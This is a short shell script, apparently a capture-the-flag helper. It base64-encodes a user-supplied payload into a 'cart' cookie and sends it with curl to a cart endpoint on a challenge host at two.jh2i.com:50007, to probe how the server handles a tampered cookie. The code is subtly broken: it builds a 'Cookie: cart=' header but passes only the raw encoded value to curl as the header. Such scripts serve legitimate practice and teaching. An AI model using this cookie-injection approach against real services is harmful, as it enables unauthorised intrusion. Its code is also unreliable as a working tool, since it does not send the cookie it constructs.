#!/bin/sh

cart=$(echo ${1} | base64 -w 0)
cookie="Cookie: cart=${cart}"
echo $cookie

curl -i -s -k -X $'GET' -H $'Host: two.jh2i.com:50007' -H "${cart}" $'http://two.jh2i.com:50007/cart'